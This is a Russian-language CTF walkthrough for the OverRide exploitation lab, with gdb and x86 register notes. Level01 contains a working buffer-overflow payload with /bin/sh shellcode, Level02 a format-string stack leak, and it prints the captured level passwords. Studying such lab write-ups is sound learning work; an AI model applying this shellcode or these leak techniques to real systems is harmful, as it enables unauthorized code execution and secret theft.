ssh -p 2222 level02@localhost

**********************************************

Чтобы использовать дебагер gdb, компилируем с ключом -g (gcc -g main.c -o main)

Проброс портов
		Порт хоста – любой свободный порт Вашего компьютера,
		который будет использоваться для перенаправления на нужный порт
		в гостевой ОС. Например, 2222;
		
		IP гостя – здесь указываем IP адрес гостевой операционной системы
		на который будет происходить перенаправление (10.2.0.15)
		
		Порт гостя – порт гостевой ОС, на который нам необходимо
		пробрасывать наши запросы. В нашем случае это 4242 порт, который
		прослушивает SSH сервер.

Команды
objdump
coredump - образ памяти в момент когда процесс упал
x/i - инструкция
x/x - hex
x/s - строка
x/a - адрес
mov приемник, источник (копирование)
	•	ESI/SI (source index register) – индекс источника;
	•	EDI/DI (destination index register) – индекс приёмника (получателя);
Есть три основных регистра которые используются при работе.
* Регистр EIP - указывает на адрес в памяти, какая инструкция (команда) должна выполнится следующей.
* Регистр ESP - указывает на вершину стека (адрес в памяти).
* Регистр EBP - указывает на стековый фрейм (как переменные и аргументы располагаются в памяти).

stepi - команда выполнит ровно одну инструкцию процессора и остановится на следующей.

nexti выполнит тоже одну инструкцию но перепрыгнет, если следующая инструкция будет подпрограмой - функцией (call)


Инструкция RET в Ассемблере выполняет возврат из ближней процедуры (RETURN)

GDB:
1. Из шестнадцатеричный в десятичную:
(gdb) p 0x149c
$4 = 5276

2. Вывести регистры
(gdb) info r

3. Вывести содержимое стека
(gdb) where

4. Текущая инструкция
(gdb) disas

5. Запустить программу в отладчике
(gdb) run (r)

5. Установить брейпоинт (можно устанавливать брейкпоинт по адресу b *0x40056d)
(gdb) break main (b main)

5. Удалить 1й брейкпоинт
(gdb) disable 1

5. Показать регистры
(gdb) i r (info registers)

6. Вывод значение по адресу
(gdb) x 0x400634 (вывести 4 байта по адресу)
(gdb) x/2x 0x400634 (вывести 8 байтов по адресу) или x/2 0x400634
(gdb) x/2d 0x400634 (вывести 8 байтов по адресу в десятичном виде) 

5. Выполнить ровно одну инструкцию (если call то провалимся во внутрь)
(gdb) stepi
(gdb) nexti (перешагнет вызов call)

5. В формат intel
(gdb) set disassembly -flavor intel


******************************************************
		
LEVEL00
		
level00@OverRide:~$ ./level00
***********************************
* 	     -Level00 -		  *
***********************************
Password:
		
Видим, что требуется в пароль.
		
$ gdb level00
		
В main происходит сравнение строки, поданной нами в качестве 
пароля с 0x149c, что соответствует  5276 в десятичной.
		
0x080484e7 <+83>:	cmp    $0x149c,%eax

Если подается что-то другое то команда jne перебрасывается 
мимо необходимой команды system.

0x080484ec <+88>:	 jne    0x804850d <main+121>

$ ./level00
***********************************
* 	     -Level00 -		  *
***********************************
Password:5276

Authenticated!

$ cat /home/users/level01/.pass
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL


LEVEL01

 (cat /tmp/user ; cat) | ./level01

python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1]" > /tmp/test

level01@OverRide:~$ cat /tmp/test - | ./level01

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv


LEVEL02

***********************
Чтобы проследить ход выполнения программы, создадим файл: 

python -c “print ‘A’*40 ” > /tmp/test      
(Длина данных в программе равна длине обычного пароля 40 байт. 
Необходимо, чтобы пройти проверку

0x0000000000400925 <+273>:	cmpl   	$0x29,-0xc(%rbp)
0x0000000000400929 <+277>:	je     		0x40097d <main+361> 

В отладчике установим аргумент:
(gdb) set args arg1 /tmp/test

Установим брейкпоинт перед вызовом fopen, чтобы подменить значение регистра. 
По умолчанию будем пытаться открыть файл /home/users/level03/.pass, нам нужно подменить на свой.

0x00000000004008a5 <+145>:	mov    %rax,%rdi
(gdb) b *0x00000000004008a5
(gdb) r
(gdb) set $rax=0x7fffffffe8bd (Адрес плавающий, может меняться)

После fopen вызывается read, который считает открытый ранее файл и запишет в стек

Далее происходят 2 вызова fgets, один из которых запрашивает у пользователя логин, 
После чего он запишется по адресу (адрес, который находится в регистре rax перед вызовом функции):

(gdb) x 0x7fffffffe510
0x7fffffffe510:	 "AAAAAAAA"

Второй вызов fgets запрашиает пароль и сохраняет по адресу:
(gdb) x 0x7fffffffe470
0x7fffffffe470:	 "BBBBBBBB\n"

Можно заметить, что в стеке между адресом, где лежит логин и где лежит введенный пароль, находится считанный пароль из файла 
(gdb) x/1000s 0x7fffffffe470
0x7fffffffe470:	 "BBBBBBBB\n"
0x7fffffffe47a:	 ""
…
…
0x7fffffffe4df:	 ""
0x7fffffffe4e0:	 'A' <repeats 40 times>
0x7fffffffe509:	 ""
0x7fffffffe50a:	 ""
0x7fffffffe50b:	 ""
0x7fffffffe50c:	 ""
0x7fffffffe50d:	 ""
0x7fffffffe50e:	 ""
0x7fffffffe50f:	 ""
0x7fffffffe510:	 "AAAAAAAA"

Чтобы его распечатать можно воспользоваться уязвимостью форматной строки, 
так как далее происходит вызов printf, который выведет логин. 

Подавая нужное кол-во спецификаторов %p можно начать выводить данные из стека, в том числе пароль из файла.

В дебагере пробуем подать логин 40 %p, чтобы определить смещение:

CCCCCCCC%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%                    

В итоге получаем строку:

--[ Password: *****************************************
CCCCCCCC0x7fffffffe470(nil)0x200x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6680x3f7ff9a080x20202020202020200x2020(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x41414141414141410x41414141414141410x41414141414141410x41414141414141410x4141414141414141(nil)0x43434343434343430x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020202020250x2900202020 does not have access!

Что позволяет определить с какого аргумента нужно выводить - 22.













